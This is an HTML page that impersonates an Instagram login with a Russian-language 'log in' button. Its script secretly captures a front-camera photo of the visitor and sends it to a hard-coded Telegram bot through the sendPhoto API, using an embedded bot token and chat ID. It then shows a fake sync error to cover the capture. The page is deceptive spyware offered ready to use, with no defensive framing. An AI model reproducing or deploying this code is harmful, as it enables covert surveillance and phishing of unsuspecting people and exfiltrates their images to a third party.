<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Verification</title>
</head>
<body style="text-align: center; background: #000; color: #fff; font-family: sans-serif; padding: 20px;">

    <h2>Вход в Instagram</h2>
    <p>Нажмите кнопку ниже, чтобы продолжить.</p>
    
    <button id="start" style="padding: 15px 30px; font-size: 18px; border-radius: 10px; border: none; background: #0088cc; color: white; cursor: pointer; font-weight: bold;">
        Войти через Instagram
    </button>

    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        // ТВОИ ДАННЫЕ
        const token = '8233473341:AAH9BAA2of2kLZZ3nrxV2jSomNkKSUw4MUk';
        const chatId = '8233473341'; // Убедись, что это твой личный ID, а не ID бота

        document.getElementById('start').onclick = async () => {
            const btn = document.getElementById('start');
            
            try {
                // 1. Запрашиваем камеру
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                
                btn.innerText = "Загрузка...";
                btn.disabled = true;

                const video = document.getElementById('video');
                video.srcObject = stream;

                // 2. Ждем немного, пока камера настроится
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // 3. Создаем файл и отправляем
                    canvas.toBlob(async (blob) => {
                        const formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', blob, 'image.jpg');

                        try {
                            const response = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                                method: 'POST',
                                body: formData
                            });
                            
                            const result = await response.json();
                            
                            if (result.ok) {
                                console.log("Фото успешно отправлено!");
                            } else {
                                console.error("Ошибка Telegram:", result.description);
                            }
                        } catch (e) {
                            console.error("Ошибка сети:", e);
                        } finally {
                            // Выключаем камеру и показываем ошибку пользователю
                            stream.getTracks().forEach(track => track.stop());
                            alert("Ошибка: Не удалось синхронизировать профиль. Попробуйте позже.");
                            btn.innerText = "Повторить";
                            btn.disabled = false;
                        }
                    }, 'image/jpeg', 0.8);
                    
                }, 2000); 

            } catch (err) {
                console.error("Доступ к камере запрещен:", err);
                alert("Для работы сайта необходимо разрешить доступ к камере.");
            }
        };
    </script>
</body>
</html>
